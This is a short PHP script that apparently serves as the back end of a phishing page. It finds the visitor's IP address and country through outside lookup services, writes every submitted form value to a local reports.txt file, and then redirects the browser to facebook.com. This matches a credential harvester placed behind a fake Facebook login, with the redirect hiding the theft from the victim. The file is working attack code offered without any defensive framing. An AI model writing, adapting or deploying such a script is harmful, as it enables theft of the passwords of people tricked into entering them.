<?php


function getIp(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }elseif ($remote == "::1") {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/?format=json');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
		$result = curl_exec($ch);
		$splitor = explode(':', $result);
		$result = $splitor[1];
		$result = str_replace('"', "", $result);
		$result = str_replace('}', "", $result);
		$ip = $result;

    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
function GetData(){
    $url = "http://www.geoplugin.net/json.gp?ip=".getIp();
    $ch = curl_init();  
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $resp=curl_exec($ch);
    curl_close($ch);
    $details = json_decode($resp, true);
    //return $resp;
    $country     = $details['geoplugin_countryName'];
    $data = $country;
    return $data;
}
$file = fopen("reports.txt","a");
$ip=getIp();
$country = GetData();


$handle = fopen("reports.txt", "a");
foreach($_POST as $variable => $value)
{
	fwrite($handle, $value.":");
}

fwrite($file,"$country");
fclose($file);
fwrite($handle, "\r\n");
fclose($handle);


header("location:https://www.facebook.com");

?>